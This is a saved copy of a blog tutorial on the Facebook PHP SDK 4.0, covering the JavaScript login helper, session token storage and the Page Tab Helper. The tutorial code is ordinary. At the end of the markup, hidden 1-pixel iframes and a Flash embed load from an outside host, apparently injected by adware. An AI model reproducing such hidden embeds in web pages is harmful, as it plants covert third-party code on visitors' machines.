alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2 highlighted">5</div><div class="line number6 index5 alt1">6</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="js plain">FB.init({</code></div><div class="line number2 index1 alt1"><code class="js spaces">&nbsp;&nbsp;</code><code class="js plain">appId&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : </code><code class="js string">'APP-ID'</code><code class="js plain">,</code></div><div class="line number3 index2 alt2"><code class="js spaces">&nbsp;&nbsp;</code><code class="js plain">xfbml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : </code><code class="js keyword">true</code><code class="js plain">,</code></div><div class="line number4 index3 alt1"><code class="js spaces">&nbsp;&nbsp;</code><code class="js plain">version&nbsp;&nbsp;&nbsp; : </code><code class="js string">'v2.0'</code><code class="js plain">,</code></div><div class="line number5 index4 alt2 highlighted"><code class="js spaces">&nbsp;&nbsp;</code><code class="js plain">cookie&nbsp;&nbsp;&nbsp;&nbsp; : </code><code class="js keyword">true</code></div><div class="line number6 index5 alt1"><code class="js plain">});</code></div></div></td></tr></tbody></table></div></div><p>That´s not the only problem, i don´t know if this is the intended way but it seems that you can get the session from the Helper only once – if you need to do more API calls with AJAX and without a page refresh, you have to store the Access Token in a PHP session again. Behold, very long code coming up:</p><div><div id="highlighter_130746" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php keyword">require</code> <code class="php string">'phpsdk4/autoload.php'</code><code class="php plain">;</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookSession;</code></div><div class="line number4 index3 alt1"><code class="php keyword">use</code> <code class="php plain">Facebook\Helpers\FacebookJavaScriptLoginHelper;</code></div><div class="line number5 index4 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookRequest;</code></div><div class="line number6 index5 alt1"><code class="php keyword">use</code> <code class="php plain">Facebook\GraphNodes\GraphUser;</code></div><div class="line number7 index6 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\FacebookRequestException;</code></div><div class="line number8 index7 alt1">&nbsp;</div><div class="line number9 index8 alt2"><code class="php plain">FacebookSession::setDefaultApplication(</code><code class="php string">'APP-ID'</code><code class="php plain">, </code><code class="php string">'APP-SECRET'</code><code class="php plain">);</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="php plain">session_start();</code></div><div class="line number12 index11 alt1"><code class="php comments">//check for existing session and validate it</code></div><div class="line number13 index12 alt2"><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'token'</code><code class="php plain">])) {</code></div><div class="line number14 index13 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$session</code> <code class="php plain">= </code><code class="php keyword">new</code> <code class="php plain">FacebookSession(</code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'token'</code><code class="php plain">]);</code></div><div class="line number15 index14 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">try</code> <code class="php plain">{</code></div><div class="line number16 index15 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$session</code><code class="php plain">-&gt;Validate(</code><code class="php string">'APP-ID'</code><code class="php plain">, </code><code class="php string">'APP-SECRET'</code><code class="php plain">);</code></div><div class="line number17 index16 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">} </code><code class="php keyword">catch</code><code class="php plain">(FacebookAuthorizationException </code><code class="php variable">$e</code><code class="php plain">) {</code></div><div class="line number18 index17 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">unset(</code><code class="php variable">$session</code><code class="php plain">);</code></div><div class="line number19 index18 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php variable">$e</code><code class="php plain">-&gt;getMessage();</code></div><div class="line number20 index19 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number21 index20 alt2"><code class="php plain">}</code></div><div class="line number22 index21 alt1">&nbsp;</div><div class="line number23 index22 alt2"><code class="php comments">//get new session</code></div><div class="line number24 index23 alt1"><code class="php keyword">if</code> <code class="php plain">(!isset(</code><code class="php variable">$session</code><code class="php plain">)) {</code></div><div class="line number25 index24 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">try</code> <code class="php plain">{</code></div><div class="line number26 index25 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$helper</code> <code class="php plain">= </code><code class="php keyword">new</code> <code class="php plain">FacebookJavaScriptLoginHelper();</code></div><div class="line number27 index26 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$session</code> <code class="php plain">= </code><code class="php variable">$helper</code><code class="php plain">-&gt;getSession();</code></div><div class="line number28 index27 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'token'</code><code class="php plain">] = </code><code class="php variable">$session</code><code class="php plain">-&gt;getToken();</code></div><div class="line number29 index28 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">} </code><code class="php keyword">catch</code><code class="php plain">(FacebookRequestException </code><code class="php variable">$e</code><code class="php plain">) {</code></div><div class="line number30 index29 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">unset(</code><code class="php variable">$session</code><code class="php plain">);</code></div><div class="line number31 index30 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php variable">$e</code><code class="php plain">-&gt;getMessage();</code></div><div class="line number32 index31 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">}</code></div><div class="line number33 index32 alt2"><code class="php plain">}</code></div><div class="line number34 index33 alt1">&nbsp;</div><div class="line number35 index34 alt2"><code class="php comments">//do some api stuff</code></div><div class="line number36 index35 alt1"><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$session</code><code class="php plain">)) {</code></div><div class="line number37 index36 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$me</code> <code class="php plain">= (</code><code class="php keyword">new</code> <code class="php plain">FacebookRequest(</code></div><div class="line number38 index37 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$session</code><code class="php plain">, </code><code class="php string">'GET'</code><code class="php plain">, </code><code class="php string">'/me'</code></div><div class="line number39 index38 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">))-&gt;execute()-&gt;getGraphObject(GraphUser::className());</code></div><div class="line number40 index39 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php functions">echo</code> <code class="php variable">$me</code><code class="php plain">-&gt;getName();</code></div><div class="line number41 index40 alt2"><code class="php plain">}</code></div></div></td></tr></tbody></table></div></div><p>I am not sure if this the correct way to use the JavaScript Login Helper, but the docs don´t show a full example and…well, it works <img src="./Facebook PHP SDK 4.0 Tutorial_files/icon_smile.gif" alt=":)" class="wp-smiley"></p><h2>Using the Page Tab Helper</h2><p>This Helper Class comes in handy for Page Apps/Tabs, you can mostly use it for getting the signed_request parameter in a convenient way:</p><div><div id="highlighter_224005" class="syntaxhighlighter  php"><table border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="php keyword">require</code> <code class="php string">'phpsdk4/autoload.php'</code><code class="php plain">;</code></div><div class="line number2 index1 alt1">&nbsp;</div><div class="line number3 index2 alt2"><code class="php keyword">use</code> <code class="php plain">Facebook\Helpers\FacebookPageTabHelper;</code></div><div class="line number4 index3 alt1">&nbsp;</div><div class="line number5 index4 alt2"><code class="php plain">FacebookSession::setDefaultApplication(</code><code class="php string">'APP-ID'</code><code class="php plain">, </code><code class="php string">'APP-SECRET'</code><code class="php plain">);</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="php variable">$helper</code> <code class="php plain">= </code><code class="php keyword">new</code> <code class="php plain">FacebookPageTabHelper();</code></div><div class="line number8 index7 alt1">&nbsp;</div><div class="line number9 index8 alt2"><code class="php functions">echo</code> <code class="php string">'&lt;p&gt;page id: '</code> <code class="php plain">. </code><code class="php variable">$helper</code><code class="php plain">-&gt;getPageId() . </code><code class="php string">'&lt;/p&gt;'</code><code class="php plain">;</code></div><div class="line number10 index9 alt1"><code class="php functions">echo</code> <code class="php string">'&lt;p&gt;liked: '</code> <code class="php plain">. </code><code class="php variable">$helper</code><code class="php plain">-&gt;isLiked() . </code><code class="php string">'&lt;/p&gt;'</code><code class="php plain">;</code></div><div class="line number11 index10 alt2"><code class="php functions">echo</code> <code class="php string">'&lt;p&gt;admin: '</code> <code class="php plain">. </code><code class="php variable">$helper</code><code class="php plain">-&gt;isAdmin() . </code><code class="php string">'&lt;/p&gt;'</code><code class="php plain">;</code></div></div></td></tr></tbody></table></div></div><p>You obviously can´t use that code with an AJAX call because the signed_request does not magically get transferred to the PHP file.</p><hr><p>There are actually some more Helper Classes like <strong>FacebookCanvasLoginHelper</strong> and <strong>FacebookRedirectLoginHelper</strong>, but i will not cover them here because the Canvas Helper is similar to the page tab helper (without the page data in the signed_request parameter, of course) and the Redirect Helper seems to be there for login with the PHP SDK. Maybe i´ll do a separate article later for it, but I recommend doing all the login stuff with the JavaScript so that´s not important.</p><p>If you got any questions, feel free to ask in the comments. Don´t forget to like/share my article if it helped you <img src="./Facebook PHP SDK 4.0 Tutorial_files/icon_smile.gif" alt=":)" class="wp-smiley"></p></div><div class="fix"></div></div><div class="shareaholic-canvas" data-app="share_buttons" data-app-id="162275"></div><div class="post-bottom"><div class="fl"><span class="cat"><a href="http://www.devils-heaven.com/category/socialmedia/facebook/" title="View all posts in Facebook" rel="category tag">Facebook</a>, <a href="http://www.devils-heaven.com/category/socialmedia/" title="View all posts in Social Media" rel="category tag">Social Media</a></span></div><div class="fr"><span class="tags"><a href="http://www.devils-heaven.com/tag/facebook-api/" rel="tag">facebook api</a>, <a href="http://www.devils-heaven.com/tag/php-sdk/" rel="tag">php sdk</a></span></div><div class="fix"></div></div></div><div class="more_entries"><div class="fl"><a href="http://www.devils-heaven.com/extended-page-access-tokens-curl/" rel="prev">Extended Page Access Tokens with CURL</a></div><div class="fr"></div><div class="fix"></div></div><div id="comments"><h3 id="pings">Trackbacks/Pingbacks</h3><ol class="pinglist"><li id="comment-5522"> <span class="author"><a href="http://www.devils-heaven.com/facebook-access-tokens/" rel="external nofollow" class="url">Facebook API - Access Tokens - Devils Heaven</a></span> - <span class="date">30. July 2014</span> <span class="pingcontent"><p>[…] to initialize the PHP SDK is explained in my Facebook PHP SDK 4.0 Tutorial. After that you need to direct the User to the authorization/login […]</p> </span></li></ol></div><div id="respond"><h3>Leave a Reply</h3><div class="cancel-comment-reply"> <small><a rel="nofollow" id="cancel-comment-reply-link" href="http://www.devils-heaven.com/facebook-php-sdk-4-0-tutorial/#respond" style="display:none;">Click here to cancel reply.</a></small></div><form action="http://www.devils-heaven.com/wp-comments-post.php" method="post" id="commentform" onsubmit="if (url.value == &#39;Website (optional)&#39;) {url.value = &#39;&#39;;}"><div class="left"><p> <input type="text" name="author" class="txt" id="commentauthor" tabindex="1" value="Name (required)" onfocus="if (this.value == &#39;Name (required)&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Name (required)&#39;;}"></p><p> <input type="text" name="email" class="txt" id="email" tabindex="2" value="Email (required)" onfocus="if (this.value == &#39;Email (required)&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Email (required)&#39;;}"></p><p> <input type="text" name="url" class="txt" id="url" tabindex="3" value="Website (optional)" onfocus="if (this.value == &#39;Website (optional)&#39;) {this.value = &#39;&#39;;}" onblur="if (this.value == &#39;&#39;) {this.value = &#39;Website (optional)&#39;;}"></p></div><div class="right"><p><textarea name="comment" id="comment" rows="10" cols="50" tabindex="4"></textarea></p><input name="submit" type="submit" id="submit" tabindex="5" value="Submit Comment"> <input type="hidden" name="comment_post_ID" value="1532"> <input type="hidden" name="comment_post_ID" value="1532" id="comment_post_ID"> <input type="hidden" name="comment_parent" id="comment_parent" value="0"><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="70e2fef9f3"></p><p style="display: none;"></p></div><input type="hidden" id="ak_js" name="ak_js" value="1407311634943"></form><div class="fix"></div></div></div><div id="sidebar" class="col-right"><div id="recent-posts-3" class="widget widget_recent_entries"><h3>Recent Posts</h3><ul><li> <a href="./Facebook PHP SDK 4.0 Tutorial_files/Facebook PHP SDK 4.0 Tutorial.htm">Facebook PHP SDK 4.0 Tutorial</a></li><li> <a href="http://www.devils-heaven.com/extended-page-access-tokens-curl/">Extended Page Access Tokens with CURL</a></li><li> <a href="http://www.devils-heaven.com/raspberry-pi-cron-jobs/">Raspberry Pi for N00bs – Cron Jobs</a></li></ul></div><div id="linkcat-2" class="widget widget_links"><h3>Links</h3><ul class="xoxo blogroll"><li><a href="http://www.bernd-pfeiffer.at/" rel="friend met colleague" title="Social Media und Jedi-Zeugs" target="_blank">Bernd Pfeiffer</a></li><li><a href="http://www.matthias-zeis.com/" rel="friend met colleague" title="Magento und Zend Framework" target="_blank">Matthias Zeis</a></li><li><a href="http://www.pfaller.cc/" rel="friend met colleague" title="eCommerce &amp; Online Marketing" target="_blank">Philipp Pfaller</a></li></ul></div><div class="adspace-widget widget"><script async="" src="./Facebook PHP SDK 4.0 Tutorial_files/adsbygoogle.js"></script> <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-6146753047819879" data-ad-slot="6530272552" data-adsbygoogle-status="done"><ins id="aswift_0_expand" style="display:inline-table;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><ins id="aswift_0_anchor" style="display:block;border:none;height:250px;margin:0;padding:0;position:relative;visibility:visible;width:300px;background-color:transparent"><iframe width="300" height="250" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" allowfullscreen="true" onload="var i=this.id,s=window.google_iframe_oncopy,H=s&amp;&amp;s.handlers,h=H&amp;&amp;H[i],w=this.contentWindow,d;try{d=w.document}catch(e){}if(h&amp;&amp;d&amp;&amp;(!d.body||!d.body.firstChild)){if(h.call){setTimeout(h,0)}else if(h.match){try{h=s.upd(h,i)}catch(e){}w.location.replace(h)}}" id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;"></iframe></ins></ins></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({});</script></div></div></div><div id="footer-widgets"><div class="container col-full"><div class="block"></div><div class="block"></div><div class="block last"></div><div class="fix"></div></div></div><div id="footer"><div class="col-full"><div id="copyright" class="col-left"><p>© 2014 Devils Heaven. All Rights Reserved.</p></div></div></div></div> <script type="text/javascript">SyntaxHighlighter.autoloader('applescript   http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAppleScript.js','actionscript3 as3  http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushAS3.js','bash shell    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushBash.js','coldfusion cf   http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushColdFusion.js','cpp c     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCpp.js','c# c-sharp csharp  http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCSharp.js','css     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushCss.js','delphi pascal pas  http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDelphi.js','diff patch       http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushDiff.js','erl erlang    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushErlang.js','groovy     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushGroovy.js','java     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJava.js','jfx javafx    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJavaFX.js','js jscript javascript http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushJScript.js','perl pl    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPerl.js','php     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPhp.js','text plain    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPlain.js','powershell ps          http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPowerShell.js','py python    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushPython.js','ruby rails ror rb  http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushRuby.js','sass scss              http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSass.js','scala     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushScala.js','sql     http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushSql.js','vb vbnet    http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushVb.js','xml xhtml xslt html http://www.devils-heaven.com/wp-content/plugins/syntax-highlighter-compress/scripts/shBrushXml.js');SyntaxHighlighter.defaults['auto-links']=false;SyntaxHighlighter.defaults['toolbar']=false;SyntaxHighlighter.defaults['tab-size']=4;SyntaxHighlighter.all();</script><script type="text/javascript">var _gaq=_gaq||[];_gaq.push(['_setAccount','UA-20378898-1']);_gaq.push(['_trackPageview']);(function(){var ga=document.createElement('script');ga.type='text/javascript';ga.async=true;ga.src=('https:'==document.location.protocol?'https://ssl':'http://www')+'.google-analytics.com/ga.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(ga,s);})();</script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/form.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/comment-reply.min.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/jquery.fancybox-1.3.6.pack.js"></script><script type="text/javascript" src="./Facebook PHP SDK 4.0 Tutorial_files/jquery.mousewheel.pack.js"></script><script type="text/javascript">jQuery(document).on('ready post-load',easy_fancybox_handler);</script><div id="fancybox-tmp"></div><div id="fancybox-loading"><div></div></div><div id="fancybox-overlay"></div><div id="fancybox-wrap"><div id="fancybox-outer"><div class="fancybox-bg" id="fancybox-bg-n"></div><div class="fancybox-bg" id="fancybox-bg-ne"></div><div class="fancybox-bg" id="fancybox-bg-e"></div><div class="fancybox-bg" id="fancybox-bg-se"></div><div class="fancybox-bg" id="fancybox-bg-s"></div><div class="fancybox-bg" id="fancybox-bg-sw"></div><div class="fancybox-bg" id="fancybox-bg-w"></div><div class="fancybox-bg" id="fancybox-bg-nw"></div><div id="fancybox-content"></div><a id="fancybox-close"></a><div id="fancybox-title"></div><a href="javascript:;" id="fancybox-left"><span class="fancy-ico" id="fancybox-left-ico"></span></a><a href="javascript:;" id="fancybox-right"><span class="fancy-ico" id="fancybox-right-ico"></span></a></div></div><iframe src="./Facebook PHP SDK 4.0 Tutorial_files/userData.htm" style="position: absolute; top: -100px; left: -100px; z-index: -10; border: none; visibility: hidden; width: 1px; height: 1px;"></iframe><iframe src="./Facebook PHP SDK 4.0 Tutorial_files/register_server_layer.htm" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;"></iframe><iframe style="position: absolute; width: 1px; height: 1px; top: 0px; left: 0px; visibility: hidden;"></iframe><iframe style="position:absolute; width:0; height:0; left:-100px; top:-100px;" src="./Facebook PHP SDK 4.0 Tutorial_files/server_layer.htm"></iframe><div id="dp_swf_engine" style="position: absolute; width: 1px; height: 1px;"><embed style="width: 1px; height: 1px;" type="application/x-shockwave-flash" src="http://www.ajaxcdn.org/swf.swf" width="1" height="1" id="_dp_swf_engine" name="_dp_swf_engine" bgcolor="#336699" quality="high" allowscriptaccess="always"></div><sfmsg id="sfMsgId" data="{&quot;imageCount&quot;:0,&quot;ip&quot;:&quot;1.1.1.1&quot;}"></sfmsg></body></html>